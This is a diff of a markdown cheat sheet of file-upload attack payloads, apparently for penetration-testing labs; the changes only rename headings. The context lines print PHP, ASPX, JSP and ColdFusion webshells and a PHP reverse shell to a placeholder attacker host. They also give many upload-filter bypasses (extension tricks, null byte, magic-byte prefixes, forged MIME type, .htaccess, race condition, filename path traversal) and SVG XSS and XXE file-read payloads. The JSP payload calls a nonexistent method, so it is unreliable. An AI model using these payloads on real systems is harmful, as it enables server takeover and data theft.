@@ -6,7 +6,7 @@
 
 ---
 
-## Upload - Detect Allowed Extensions
+## enum allowed extensions
 Probe baseline allowed types.
 
 ```bash
@@ -17,7 +17,7 @@ for ext in jpg png gif pdf txt doc xlsx zip; do echo "test.${ext}"; done
 
 ---
 
-## Upload - Minimal PHP Webshell
+## minimal php webshell GET
 Simplest PHP one-liner shell.
 
 ```bash
@@ -28,7 +28,7 @@ echo '<?php system($_GET["c"]); ?>'
 
 ---
 
-## Upload - PHP Webshell (POST)
+## php webshell POST
 POST-based shell to evade GET logging.
 
 ```bash
@@ -39,7 +39,7 @@ echo '<?php if(isset($_POST["c"])){system($_POST["c"]);} ?>'
 
 ---
 
-## Upload - PHP Reverse Shell One-Liner
+## php reverse shell one liner
 Inline reverse shell via PHP.
 
 ```bash
@@ -50,7 +50,7 @@ echo '<?php system("/bin/bash -c '"'"'bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:p
 
 ---
 
-## Upload - Bypass: Alternate PHP Extensions
+## bypass upload alternate php extensions
 When .php is blocked, try variants.
 
 ```bash
@@ -61,7 +61,7 @@ echo "shell.php3 shell.php4 shell.php5 shell.php7 shell.phtml shell.phar shell.p
 
 ---
 
-## Upload - Bypass: Mixed Case
+## bypass upload mixed case extension
 Extension case-only checks.
 
 ```bash
@@ -72,7 +72,7 @@ echo "shell.PhP shell.PHP shell.pHp5 shell.PHp7"
 
 ---
 
-## Upload - Bypass: Double Extension
+## bypass upload double extension
 Bypass naive last-token check.
 
 ```bash
@@ -83,7 +83,7 @@ echo "shell.php.jpg shell.jpg.php shell.php%00.jpg shell.php;.jpg"
 
 ---
 
-## Upload - Bypass: Null Byte
+## bypass upload null byte
 Truncate extension on legacy stacks.
 
 ```bash
@@ -94,7 +94,7 @@ echo "shell.php%00.jpg"
 
 ---
 
-## Upload - Bypass: Magic Bytes (GIF89a)
+## bypass upload magic bytes gif
 Prepend GIF header so magic-byte check passes.
 
 ```bash
@@ -105,7 +105,7 @@ printf 'GIF89a;\n<?php system($_GET[0]); ?>' > shell.php.gif
 
 ---
 
-## Upload - Bypass: Magic Bytes (PNG)
+## bypass upload magic bytes png
 PNG magic header.
 
 ```bash
@@ -116,7 +116,7 @@ printf '\x89PNG\r\n\x1a\n<?php system($_GET[0]); ?>' > shell.php.png
 
 ---
 
-## Upload - Bypass: Magic Bytes (JPEG)
+## bypass upload magic bytes jpeg
 JPEG magic header.
 
 ```bash
@@ -127,7 +127,7 @@ printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00<?php system($_GET[0]); ?>' > shell.php.
 
 ---
 
-## Upload - Bypass: Content-Type Header
+## bypass upload content-type mime
 Force allowed MIME via curl.
 
 ```bash
@@ -138,7 +138,7 @@ curl -F "file=@shell.php;type=image/jpeg" -F "submit=Upload" {{URL:url:http://ta
 
 ---
 
-## Upload - Bypass: .htaccess
+## bypass upload htaccess
 Drop .htaccess to make custom ext run as PHP.
 
 ```bash
@@ -149,7 +149,7 @@ echo "AddType application/x-httpd-php .pwn" > .htaccess
 
 ---
 
-## Upload - Bypass: Apache Multiple Extensions
+## bypass upload apache multiple extensions
 Apache parses leftmost recognized ext.
 
 ```bash
@@ -160,7 +160,7 @@ echo "shell.php.foo shell.foo.php shell.php.gif"
 
 ---
 
-## Upload - Bypass: IIS Semicolon
+## bypass upload iis semicolon
 IIS <7 parses ;.ext to ignore filter ext.
 
 ```bash
@@ -171,7 +171,7 @@ echo "shell.asp;.jpg"
 
 ---
 
-## Upload - Bypass: IIS Tilde Short Name
+## enum iis tilde short name
 Short-name disclosure.
 
 ```bash
@@ -182,7 +182,7 @@ curl -s "{{URL:url:http://target.htb/}}*~1*/.aspx"
 
 ---
 
-## Upload - Bypass: SVG XSS
+## upload svg XSS
 SVG with embedded JS.
 
 ```bash
@@ -193,7 +193,7 @@ echo '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert
 
 ---
 
-## Upload - Bypass: SVG XXE
+## upload svg XXE file read
 SVG with XXE for file read.
 
 ```bash
@@ -204,7 +204,7 @@ echo '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passw
 
 ---
 
-## Upload - Webshell ASPX
+## aspx webshell iis
 ASPX shell for IIS.
 
 ```bash
@@ -215,7 +215,7 @@ echo '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c 
 
 ---
 
-## Upload - Webshell JSP
+## jsp webshell tomcat
 JSP shell for Tomcat.
 
 ```bash
@@ -226,7 +226,7 @@ echo '<%Runtime.getRuntime().shellRun(request.getParameter("c"));%>'
 
 ---
 
-## Upload - Webshell Cold Fusion
+## coldfusion cfm webshell
 ColdFusion CFM shell.
 
 ```bash
@@ -237,7 +237,7 @@ echo '<cfexecute name="cmd.exe" arguments="/c #URL.cmd#" timeout="20"></cfexecut
 
 ---
 
-## Upload - Polyglot JPEG+PHP
+## build polyglot jpeg php shell
 Image-valid + PHP shell.
 
 ```bash
@@ -248,7 +248,7 @@ exiftool -Comment='<?php system($_GET[0]); ?>' image.jpg && mv image.jpg image.p
 
 ---
 
-## Upload - Race Condition
+## exploit upload race condition
 Upload + run before cleanup.
 
 ```bash
@@ -259,7 +259,7 @@ while true; do curl -F "file=@shell.php" {{URL:url:http://target.htb/upload.php}
 
 ---
 
-## Upload - Path Traversal in Filename
+## upload path traversal filename
 Try escape with .. in name.
 
 ```bash
@@ -270,7 +270,7 @@ curl -F 'file=@shell.php;filename=../../../var/www/html/shell.php' {{URL:url:htt
 
 ---
 
-## Upload - ZIP Slip
+## exploit zip slip traversal
 Tar/zip with traversal entries.
 
 ```bash
